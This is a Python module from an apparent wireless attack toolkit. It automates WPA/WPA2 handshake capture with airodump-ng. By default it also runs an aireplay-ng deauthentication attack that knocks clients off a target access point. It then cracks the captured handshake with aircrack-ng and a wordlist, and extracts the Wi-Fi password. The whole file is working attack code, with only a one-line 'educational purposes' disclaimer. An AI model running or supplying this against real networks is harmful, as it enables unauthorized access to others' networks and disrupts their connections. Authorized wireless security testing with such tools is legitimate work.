# modules/handshake.py

import subprocess
import os
import sys
import shutil
import time
import argparse
import re
import signal

# --- Configuration ---
CAPTURE_DIR_DEFAULT = "/tmp/wifi_captures"
AIRODUMP_COMMAND = "airodump-ng"
AIREPLAY_COMMAND = "aireplay-ng"
AIRCRACK_COMMAND = "aircrack-ng"
# ---------------------

# Global list to keep track of running processes for cleanup
running_processes = []


def check_tool_installed(name):
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it.")
        return False
    return True


def run_command_check_output(command, use_sudo=True, timeout=None):
    """Helper to run a command and get its output, checking for errors."""
    cmd_list = command
    if use_sudo and os.geteuid() != 0:
        if not check_tool_installed("sudo"): return None, "sudo not found"
        cmd_list = ["sudo"] + command

    print(f"[*] Executing: {' '.join(cmd_list)}")
    try:
        result = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=timeout)
        return result.stdout, None
    except subprocess.CalledProcessError as e:
        return e.stdout, e.stderr  # stdout might still have useful info
    except FileNotFoundError:
        return None, f"Command '{cmd_list[0]}' not found."
    except subprocess.TimeoutExpired:
        return None, "Command timed out."
    except Exception as e:
        return None, str(e)


def start_background_process(command, use_sudo=True):
    """Starts a command in the background and returns the Popen object."""
    global running_processes
    cmd_list = command
    if use_sudo and os.geteuid() != 0:
        if not check_tool_installed("sudo"): return None
        cmd_list = ["sudo"] + command

    print(f"[*] Starting background process: {' '.join(cmd_list)}")
    try:
        # Redirect output to /dev/null unless debugging
        process = subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_processes.append(process)
        time.sleep(0.5)  # Brief pause to let it start
        if process.poll() is not None:  # Check if it terminated immediately
            print(
                f"[!] Background process {cmd_list[0]} failed to start or exited immediately (code: {process.returncode}).")
            running_processes.remove(process)
            return None
        return process
    except FileNotFoundError:
        print(f"[!] Error: Command '{cmd_list[0]}' not found.")
        return None
    except Exception as e:
        print(f"[!] Error starting background process '{cmd_list[0]}': {e}")
        return None


def stop_all_background_processes():
    """Stops all tracked background processes."""
    global running_processes
    print("[*] Stopping background processes...")
    for p in reversed(running_processes):
        if p.poll() is None:  # If process is still running
            print(f"[*] Terminating PID {p.pid} ({p.args[0] if isinstance(p.args, list) else p.args})...")
            try:
                # Attempt graceful termination first
                # For sudo processes started by non-root, os.kill with sudo might be needed
                # but p.terminate() should work for child processes.
                if os.geteuid() == 0:  # If script is root, direct kill
                    os.kill(p.pid, signal.SIGTERM)
                else:  # If script is not root, but process was sudo'd
                    # This is tricky. p.terminate() might not work on the sudo'd process itself.
                    # Best to handle SIGINT in the main script to trigger cleanup.
                    p.terminate()

                p.wait(timeout=3)
            except subprocess.TimeoutExpired:
                print(f"[!] PID {p.pid} did not terminate gracefully, sending SIGKILL.")
                if os.geteuid() == 0:
                    os.kill(p.pid, signal.SIGKILL)
                else:
                    p.kill()  # Fallback to p.kill()
                p.wait()
            except Exception as e:
                print(f"[!] Error terminating PID {p.pid}: {e}. Trying p.kill().")
                p.kill()  # Fallback
                p.wait()
    running_processes.clear()


def capture_handshake(interface, target_bssid, channel, output_prefix, capture_dir=CAPTURE_DIR_DEFAULT,
                      deauth_packets=0, deauth_client="FF:FF:FF:FF:FF:FF", timeout=None):
    """
    Captures WPA/WPA2 handshake.

    :param interface: Wireless interface in monitor mode.
    :param target_bssid: BSSID of the target AP.
    :param channel: Channel of the target AP.
    :param output_prefix: Prefix for the capture file names (e.g., "mycapture").
    :param capture_dir: Directory to save capture files.
    :param deauth_packets: Number of deauth packets to send (0 for none, >0 for specific count).
    :param deauth_client: Client MAC to deauth. "FF:FF:FF:FF:FF:FF" for broadcast.
    :param timeout: Optional timeout in seconds for the capture.
    :return: Path to the .cap file if handshake seems captured, None otherwise.
    """
    print(f"[*] Preparing to capture handshake for BSSID {target_bssid} on channel {channel}.")
    print(f"[!] Ensure interface '{interface}' is in MONITOR MODE.")

    for tool in [AIRODUMP_COMMAND, AIREPLAY_COMMAND]:  # AIREPLAY_COMMAND only if deauth_packets > 0
        if not check_tool_installed(tool): return None

    os.makedirs(capture_dir, exist_ok=True)
    # airodump-ng appends -01.cap, -01.csv etc. We want the base path.
    capture_base_path = os.path.join(capture_dir, output_prefix)
    # The actual .cap file will be something like /tmp/wifi_captures/mycapture-01.cap
    # We'll determine the exact name later or let aircrack find it.

    airodump_cmd = [
        AIRODUMP_COMMAND,
        "--bssid", target_bssid,
        "--channel", str(channel),
        "--write", capture_base_path,
        # "--output-format", "pcap,csv", # Ensure pcap is primary for aircrack
        interface
    ]

    airodump_proc = None
    aireplay_proc = None
    handshake_detected = False
    final_cap_file = None

    try:
        print(f"[+] Starting packet capture (airodump-ng). Output prefix: {capture_base_path}")
        print(f"[+] Watch airodump-ng output for 'WPA handshake: {target_bssid}'")
        if timeout:
            print(f"[+] Capture will run for a maximum of {timeout} seconds.")
        print("[+] Press Ctrl+C to stop capturing manually.")

        # Start airodump-ng. We need to monitor its output if possible, or run for a fixed time.
        # For simplicity here, we'll let it run and the user can stop it, or timeout.
        # A more advanced version would parse airodump-ng's CSV output or screen output for handshake.

        # Using Popen to manage the process directly and allow interaction/termination
        airodump_proc = subprocess.Popen(["sudo"] + airodump_cmd if os.geteuid() != 0 else airodump_cmd,
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        running_processes.append(airodump_proc)  # Add to global list for cleanup

        start_time = time.time()

        if deauth_packets > 0:
            print(f"[+] Starting deauthentication attack (aireplay-ng) to speed up handshake capture.")
            aireplay_cmd = [
                AIREPLAY_COMMAND,
                "--deauth", str(deauth_packets),
                "-a", target_bssid,
            ]
            if deauth_client and deauth_client.upper() != "FF:FF:FF:FF:FF:FF":
                aireplay_cmd.extend(["-c", deauth_client])
            aireplay_cmd.append(interface)

            aireplay_proc = start_background_process(aireplay_cmd)
            # aireplay_proc will be cleaned up by stop_all_background_processes

        # Monitor airodump-ng output for handshake
        while True:
            if airodump_proc.stdout:
                line = airodump_proc.stdout.readline()
                if line:
                    sys.stdout.write(f"[Airodump] {line}")  # Show airodump output
                    sys.stdout.flush()
                    if f"WPA handshake: {target_bssid.upper()}" in line.upper():
                        print(f"\n\033[92m[+] WPA Handshake detected for {target_bssid} by airodump-ng!\033[0m")
                        handshake_detected = True
                        # Let it capture a bit more to ensure full handshake then break
                        time.sleep(5)  # Capture a few more seconds
                        break  # Handshake found

            if timeout and (time.time() - start_time > timeout):
                print("\n[!] Capture timeout reached.")
                break
            if airodump_proc.poll() is not None:  # Airodump exited
                print("\n[!] Airodump-ng process terminated.")
                break
            time.sleep(0.1)  # Small delay to avoid busy-waiting

    except KeyboardInterrupt:
        print("\n[!] Capture interrupted by user.")
    except Exception as e:
        print(f"[!] An error occurred during capture: {e}")
    finally:
        if airodump_proc and airodump_proc.poll() is None:
            print("[*] Stopping airodump-ng...")
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                airodump_proc.kill()

        # Aireplay proc is handled by stop_all_background_processes if added there,
        # or needs specific handling if started differently.
        # For this structure, it's better to ensure all background procs are stopped
        # by the main signal handler or at the end of the script.
        # stop_all_background_processes() # Call this in main signal handler or end of script

    # Find the actual .cap file
    # airodump-ng creates files like prefix-01.cap, prefix-02.cap, etc.
    # We need the latest one.
    cap_files_found = [os.path.join(capture_dir, f) for f in os.listdir(capture_dir)
                       if f.startswith(output_prefix) and f.endswith(".cap")]
    if cap_files_found:
        final_cap_file = max(cap_files_found, key=os.path.getctime)  # Get the most recent
        print(f"[+] Capture file(s) saved with prefix '{capture_base_path}'. Most recent .cap: {final_cap_file}")

        if not handshake_detected:
            print("[!] Handshake was NOT explicitly detected by airodump-ng during capture.")
            print("    You can still try to crack the file, but success is less likely.")
        else:
            # Optionally, verify with pyrit or tshark if handshake is truly present
            pass

        return final_cap_file  # Return the path to the .cap file
    else:
        print(f"[-] No .cap files found with prefix '{output_prefix}' in '{capture_dir}'.")
        return None


def crack_handshake_file(capture_file, wordlist_file, target_bssid=None):
    """
    Cracks a WPA/WPA2 handshake file using aircrack-ng.

    :param capture_file: Path to the .cap file containing the handshake.
    :param wordlist_file: Path to the wordlist.
    :param target_bssid: (Optional but recommended) BSSID of the target AP.
    :return: The found password as a string, or None.
    """
    print(f"[*] Attempting to crack handshake file: {capture_file}")
    if not check_tool_installed(AIRCRACK_COMMAND): return None
    if not os.path.isfile(capture_file):
        print(f"[!] Capture file not found: {capture_file}")
        return None
    if not os.path.isfile(wordlist_file):
        print(f"[!] Wordlist file not found: {wordlist_file}")
        return None

    aircrack_cmd = [AIRCRACK_COMMAND, "-w", wordlist_file]
    if target_bssid:
        aircrack_cmd.extend(["-b", target_bssid])
    else:
        print("[!] Warning: No BSSID specified for cracking. Aircrack-ng will try all networks in the file.")
    aircrack_cmd.append(capture_file)

    print(f"[+] Starting aircrack-ng. This may take a very long time.")
    print(f"    Command: {'sudo ' if os.geteuid() != 0 else ''}{' '.join(aircrack_cmd)}")

    # Use Popen to stream output and parse it
    process_args = ["sudo"] + aircrack_cmd if os.geteuid() != 0 else aircrack_cmd
    try:
        process = subprocess.Popen(process_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
        running_processes.append(process)  # For cleanup if script is interrupted

        found_password = None
        key_found_line = ""

        for line in iter(process.stdout.readline, ''):
            sys.stdout.write(f"[Aircrack] {line}")
            sys.stdout.flush()
            if "KEY FOUND!" in line.upper():
                key_found_line = line
                break  # Found the key

        process.stdout.close()
        return_code = process.wait()
        running_processes.remove(process)  # Remove from list as it's done

        if key_found_line:
            print("\n[+] Password Potentially Found by Aircrack-ng!")
            match = re.search(r"KEY FOUND! \[ (.*?) \]", key_found_line, re.IGNORECASE)
            if match:
                potential_pw = match.group(1).strip()
                ascii_match = re.search(r"\(ASCII:\s*(.+?)\)", potential_pw, re.IGNORECASE)
                if ascii_match:
                    found_password = ascii_match.group(1).strip()
                else:
                    found_password = potential_pw

            if found_password:
                print(f"\033[92m[SUCCESS] Password: {found_password}\033[0m")
                return found_password
            else:
                print("[-] 'KEY FOUND!' detected, but could not parse the password from the line:")
                print(f"    '{key_found_line.strip()}'")
                return None
        else:
            if return_code == 0:
                print("\n[-] Password not found in the wordlist (aircrack-ng finished).")
            else:
                stderr_output = process.stderr.read()
                print(f"\n[-] Aircrack-ng exited with code {return_code}.")
                if stderr_output: print(f"    Error: {stderr_output.strip()}")
            return None

    except KeyboardInterrupt:
        print("\n[!] Cracking interrupted by user.")
        if 'process' in locals() and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=2)
            except:
                process.kill()
            if process in running_processes: running_processes.remove(process)
        return None
    except Exception as e:
        print(f"[!] An error occurred during cracking: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description="Capture and crack WPA/WPA2 handshakes.")
    parser.add_argument("interface", help="Wireless interface in MONITOR MODE (e.g., wlan0mon).")
    parser.add_argument("bssid", help="BSSID (MAC address) of the target Access Point.")
    parser.add_argument("channel", type=int, help="Channel of the target AP.")
    parser.add_argument("-w", "--wordlist", help="Path to the wordlist file for cracking.")
    parser.add_argument("-o", "--output-prefix", default="handshake_capture",
                        help="Prefix for the output capture file names (default: handshake_capture).")
    parser.add_argument("-d", "--capture-dir", default=CAPTURE_DIR_DEFAULT,
                        help=f"Directory to save captures (default: {CAPTURE_DIR_DEFAULT}).")
    parser.add_argument("--deauth", type=int, default=5, metavar="PACKETS",
                        help="Number of deauth packets to send during capture (0 for none, default: 5).")
    parser.add_argument("--deauth-client", default="FF:FF:FF:FF:FF:FF", metavar="MAC",
                        help="Client MAC to target with deauth (default: FF:FF:FF:FF:FF:FF for broadcast).")
    parser.add_argument("--timeout", type=int, help="Maximum time (seconds) to run capture before stopping.")
    parser.add_argument("--crack-only", metavar="CAPTURE_FILE",
                        help="Path to an existing .cap file to crack (skips capture).")

    args = parser.parse_args()

    print("=======================================================")
    print("           WPA/WPA2 Handshake Tool                   ")
    print("=======================================================")
    print("Disclaimer: Educational purposes ONLY. Unauthorized access is illegal.")
    print(f"[!] Ensure '{args.interface}' is in MONITOR MODE!")
    print("=======================================================\n")

    if os.geteuid() != 0:
        print("[!] This script uses tools that require root privileges.")
        print("    Please run with sudo: sudo python3 your_script_name.py ...")
        # For tools called with "sudo" internally, the script itself doesn't strictly need to be root,
        # but it's common practice for WiFi tools. The internal sudo calls handle this.

    captured_file_path = None

    # Global signal handler for graceful shutdown
    def signal_handler(sig, frame):
        print(f"\n[!] Signal {sig} received. Shutting down gracefully...")
        stop_all_background_processes()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
    signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

    try:
        if args.crack_only:
            if not args.wordlist:
                print("[!] Error: Wordlist (-w/--wordlist) is required for --crack-only mode.")
                sys.exit(1)
            captured_file_path = args.crack_only
            print(f"[*] Crack-only mode: Using existing file {captured_file_path}")
        else:
            captured_file_path = capture_handshake(
                args.interface, args.bssid, args.channel, args.output_prefix,
                args.capture_dir, args.deauth, args.deauth_client, args.timeout
            )

        if captured_file_path and args.wordlist:
            print(f"\n[*] Proceeding to crack: {captured_file_path}")
            password = crack_handshake_file(captured_file_path, args.wordlist, args.bssid)
            if password:
                print(f"\n[SUCCESS] Password cracked: {password}")
            else:
                print(f"\n[-] Failed to crack password from {captured_file_path} with wordlist {args.wordlist}.")
        elif captured_file_path and not args.wordlist:
            print(f"\n[*] Handshake capture completed: {captured_file_path}")
            print("[*] No wordlist provided, skipping cracking phase.")
        elif not captured_file_path and not args.crack_only:
            print("\n[-] Handshake capture failed or no file was produced.")

    except Exception as e:  # Catch any other unexpected error in main logic
        print(f"[!!!] An unexpected critical error occurred in main: {e}")
    finally:
        stop_all_background_processes()  # Ensure all background processes are cleaned up
        print("\n[*] Script finished.")


if __name__ == "__main__":
    main()